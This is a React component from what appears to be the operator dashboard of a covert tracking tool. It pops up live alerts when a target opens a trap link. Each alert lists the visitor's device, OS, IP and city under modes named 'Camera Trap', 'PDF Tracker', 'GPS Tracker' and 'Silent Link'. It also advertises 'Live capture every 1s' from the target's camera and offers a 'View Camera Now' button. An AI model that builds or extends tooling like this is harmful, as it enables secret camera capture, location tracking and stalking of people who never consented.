import React, { useEffect } from 'react';
import {
  Camera,
  FileText,
  Crosshair,
  Radio,
  Smartphone,
  Laptop,
  Globe,
  X,
  Eye,
} from 'lucide-react';
import { VisitRecord } from '../types';
import { Language } from '../translations';

export interface LiveDeviceAlertToastProps {
  visits: VisitRecord[];
  lang: Language;
  onDismiss: (visitId: string) => void;
  onViewDetails: (visit: VisitRecord) => void;
}

export const LiveDeviceAlertToast: React.FC<LiveDeviceAlertToastProps> = ({
  visits,
  lang,
  onDismiss,
  onViewDetails,
}) => {
  if (!visits || visits.length === 0) return null;

  const isAr = lang === 'ar';

  return (
    <div
      id="live-device-alert-toast-container"
      className="fixed bottom-4 right-4 z-50 flex flex-col gap-2 max-w-[280px] sm:max-w-[320px] w-full pointer-events-none"
      dir={isAr ? 'rtl' : 'ltr'}
    >
      {visits.map((visit) => {
        const mode = visit.mode || 'camera';
        const isCamera = mode === 'camera';
        const isPdf = mode === 'pdf';
        const isPrecise = mode === 'precise';

        const sectionName = isCamera
          ? isAr
            ? 'فخ الكاميرا'
            : 'Camera Trap'
          : isPdf
          ? isAr
            ? 'تتبع PDF'
            : 'PDF Tracker'
          : isPrecise
          ? isAr
            ? 'تتبع GPS'
            : 'GPS Tracker'
          : isAr
          ? 'تتبع صامت'
          : 'Silent Link';

        const SectionIcon = isCamera
          ? Camera
          : isPdf
          ? FileText
          : isPrecise
          ? Crosshair
          : Radio;

        const badgeColor = isCamera
          ? 'bg-rose-500/10 text-rose-400 border-rose-500/20'
          : isPdf
          ? 'bg-amber-500/10 text-amber-400 border-amber-500/20'
          : isPrecise
          ? 'bg-emerald-500/10 text-emerald-400 border-emerald-500/20'
          : 'bg-indigo-500/10 text-indigo-400 border-indigo-500/20';

        const isMobile =
          visit.os?.toLowerCase().includes('ios') ||
          visit.os?.toLowerCase().includes('android') ||
          visit.device?.toLowerCase().includes('mobile');

        const DeviceIcon = isMobile ? Smartphone : Laptop;

        return (
          <div
            key={visit.id}
            id={`device-alert-card-${visit.id}`}
            className="pointer-events-auto bg-slate-950/95 text-slate-100 backdrop-blur-sm rounded-xl border border-rose-500/30 shadow-lg p-2.5 transition-all duration-300 flex flex-col gap-1.5 ring-1 ring-white/10"
          >
            {/* Header: Compact badge & close */}
            <div className="flex items-center justify-between gap-1">
              <div className="flex items-center gap-1.5 min-w-0">
                <span className="relative flex h-1.5 w-1.5 shrink-0">
                  <span className="animate-ping absolute inline-flex h-full w-full rounded-full bg-rose-400 opacity-75"></span>
                  <span className="relative inline-flex rounded-full h-1.5 w-1.5 bg-rose-500"></span>
                </span>
                <span
                  className={`inline-flex items-center gap-1 px-1.5 py-0.5 rounded-md text-[10px] font-medium border truncate ${badgeColor}`}
                >
                  <SectionIcon className="w-3 h-3 shrink-0" />
                  <span className="truncate">{sectionName}</span>
                </span>
              </div>

              <button
                type="button"
                onClick={() => onDismiss(visit.id)}
                className="p-0.5 rounded text-slate-400 hover:text-white hover:bg-white/10 transition-colors shrink-0"
                aria-label="Dismiss"
              >
                <X className="w-3.5 h-3.5" />
              </button>
            </div>

            {/* Device and IP Details - Ultra Compact */}
            <div className="flex items-start gap-2 bg-white/5 rounded-lg p-2 border border-white/5 min-w-0">
              <div className="p-1 rounded bg-rose-500/10 text-rose-400 shrink-0 mt-0.5">
                <DeviceIcon className="w-3.5 h-3.5" />
              </div>
              <div className="flex-1 min-w-0 text-left" style={{ textAlign: isAr ? 'right' : 'left' }}>
                <div className="flex items-baseline justify-between gap-1 min-w-0">
                  <span className="text-xs font-bold text-white truncate max-w-[120px] sm:max-w-[150px]">
                    {visit.device || (isAr ? 'جهاز غير معروف' : 'Unknown Device')}
                  </span>
                  <span className="text-[9px] text-slate-400 truncate font-mono">
                    ({visit.os || 'OS'})
                  </span>
                </div>

                <div className="flex items-center gap-1.5 text-[10px] text-slate-300 mt-0.5 min-w-0">
                  <span className="font-mono text-slate-200 shrink-0">{visit.ip}</span>
                  {(visit.city || visit.country) && (
                    <>
                      <span className="text-slate-500 shrink-0">•</span>
                      <span className="inline-flex items-center gap-0.5 text-slate-300 truncate">
                        <Globe className="w-2.5 h-2.5 text-slate-400 shrink-0" />
                        <span className="truncate max-w-[60px]">
                          {visit.city || visit.country}
                        </span>
                      </span>
                    </>
                  )}
                </div>

                {/* Live stream status */}
                {isCamera && (
                  <div className="flex items-center gap-1 mt-1 text-[9px] text-rose-300 font-medium">
                    <Camera className="w-3 h-3 text-rose-400 animate-pulse shrink-0" />
                    <span className="truncate">
                      {isAr
                        ? 'التقاط مباشر كل ثانية...'
                        : 'Live capture every 1s...'}
                    </span>
                  </div>
                )}
              </div>
            </div>

            {/* Quick Action Button */}
            <button
              type="button"
              id={`btn-view-alert-details-${visit.id}`}
              onClick={() => onViewDetails(visit)}
              className="w-full inline-flex items-center justify-center gap-1 py-1 rounded-lg bg-rose-600 hover:bg-rose-500 text-white text-[11px] font-bold shadow transition-all active:scale-95"
            >
              <Eye className="w-3 h-3" />
              <span>
                {isAr ? 'عرض الكاميرا فوراً' : 'View Camera Now'}
              </span>
            </button>
          </div>
        );
      })}
    </div>
  );
};
